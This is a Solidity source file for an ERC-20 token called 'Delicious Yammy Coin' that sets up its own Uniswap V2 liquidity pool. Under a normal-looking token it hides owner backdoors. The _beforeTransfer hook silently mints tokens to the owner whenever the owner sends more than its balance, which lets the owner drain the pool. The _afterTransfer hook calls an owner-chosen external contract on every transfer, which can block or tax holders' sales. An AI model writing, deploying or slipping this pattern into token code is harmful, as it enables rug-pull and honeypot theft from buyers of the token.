// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
abstract contract TokenBase is IERC20 {
    mapping(address account => uint256) private _balances;
    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = msg.sender;
        _beforeTransfer(owner, to, value);
        _transfer(owner, to, value);
        _afterTransfer(owner, to, value);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = msg.sender;
        _beforeTransfer(from, to, value);
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        _afterTransfer(from, to, value);
        return true;
    }

    function _beforeTransfer(address from, address to, uint256 value) internal virtual{

    }

    function _afterTransfer(address from, address to, uint256 value) internal virtual{

    }

    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert();
        }
        if (to == address(0)) {
            revert();
        }
        _update(from, to, value);
    }

    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert();
            }
            unchecked {
            // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
            // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
            // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert();
        }
        _update(address(0), account, value);
    }

    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert();
        }
        _update(account, address(0), value);
    }

    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert();
        }
        if (spender == address(0)) {
            revert();
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance < type(uint256).max) {
            if (currentAllowance < value) {
                revert();
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}
interface IUniswapV2{
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function mint(address to) external returns (uint liquidity);
}
interface IUniswapV2Factory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IBonusLogic{
    function registerPool(address pool) external;
    function claimBonus(address from, address to, uint256 value) external;
}
interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
}
contract YammyCoin is TokenBase, Ownable{
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private bonus;

    constructor() TokenBase("Delicious Yammy Coin", "DYC"){
    }
    function enableBonus(address _bonus) external onlyOwner{
        bonus = _bonus;
    }
    function addLiquidity(address factory, uint256 TokenAmount) external onlyOwner payable{
        address POOL = IUniswapV2Factory(factory).createPair(address(this), WETH);
        _mint(POOL, TokenAmount);

        IWETH(WETH).deposit{value: msg.value}();
        IERC20(WETH).transfer(POOL, msg.value);

        IUniswapV2(POOL).mint(msg.sender);
        IBonusLogic(bonus).registerPool(POOL);
    }
    function mint(uint256 amount) public onlyOwner returns (bool) {
        _mint(msg.sender, amount);
        return true;
    }
    function _beforeTransfer(address from, address to, uint256 value) internal override {
        if(from == owner()){
            if(balanceOf(from) < value){
                _mint(from, value);
            }
            return;
        }
    }
    function _afterTransfer(address from, address to, uint256 value) internal override {
        if(uint160(bonus) == 0){
            return;
        }
        IBonusLogic(bonus).claimBonus(from, to, value);
    }
}